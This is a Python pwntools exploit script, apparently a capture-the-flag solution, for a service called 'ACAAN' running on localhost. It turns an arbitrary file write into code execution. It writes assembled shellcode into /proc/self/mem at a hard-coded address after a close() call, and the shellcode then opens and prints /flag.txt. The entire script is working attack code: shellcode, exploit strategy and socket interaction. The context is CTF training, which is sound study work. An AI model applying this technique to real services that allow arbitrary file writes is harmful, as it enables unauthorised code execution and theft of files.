#!/usr/bin/env python3
"""
ACAAN Exploit - Arbitrary file write to flag read

Strategy:
1. Find the instruction right after `call close@plt` in the binary
2. Use /proc/self/mem to overwrite that location with shellcode
3. When close() returns, execution falls through into our shellcode
4. Shellcode opens /flag.txt, reads it, and writes to stdout
"""
from pwn import asm, log, remote

# This was determined by looking at the binary in cutter.
# Its just the address after the call to close() in main().
# objdump is also valid. Note that this only works because
# the binary has PIE disabled, otherwise we would need to get
# more creative.
TARGET_ADDR = 0x4014fd

# Shellcode using jmp/call/pop technique to get flag path address.
#    1. Open /flag.txt
#    2. Read contents to stack buffer
#    3. Write to stdout
#    4. Exit cleanly
shellcode = asm('''
        jmp get_filename
        
    got_filename:
        pop rdi                 /* filename pointer */
        xor rsi, rsi            /* O_RDONLY = 0 */
        xor rdx, rdx            /* mode = 0 */
        mov rax, 2              /* SYS_open */
        syscall
        
        /* read(fd, buf, 0x100) */
        mov rdi, rax            /* fd from open */
        sub rsp, 0x100          /* allocate stack buffer */
        lea rsi, [rsp]          /* buf */
        mov rdx, 0x100          /* count */
        xor rax, rax            /* SYS_read */
        syscall
        
        /* write(1, buf, bytes_read) */
        mov rdx, rax            /* count = bytes read */
        mov rdi, 1              /* stdout */
        mov rax, 1              /* SYS_write */
        syscall
        
        /* exit(0) */
        xor rdi, rdi
        mov rax, 60             /* SYS_exit */
        syscall
        
    get_filename:
        call got_filename
        .asciz "/flag.txt"
    ''', arch='amd64', os='linux')

log.info(f"Target address (after call close): {hex(TARGET_ADDR)}")
log.info(f"Shellcode length: {len(shellcode)} bytes")

io = remote("localhost", 8080)

# Write shellcode to /proc/self/mem at the target address
io.recvuntil(b'Filename?\n')
io.sendline(b'/proc/self/mem')

io.recvuntil(b'Offset into the file (either decimal, or 0xhex)?\n')
io.sendline(f'{TARGET_ADDR}'.encode())

io.recvuntil(b'end with "\\n.\\n" or by closing the socket)\n')
# Send shellcode followed by terminator sequence \n.\n
io.sendline(shellcode)
io.sendline(b'.')

log.info("Payload sent, waiting for flag...")
io.recvuntil(b'Hope this is everything you were hoping for!\n', timeout=2)

flag = io.recvall(timeout=3)
if flag:
    # Extract flag if present
    flag_str = flag.decode(errors='ignore').strip()
    log.success(f"Flag: {flag_str}")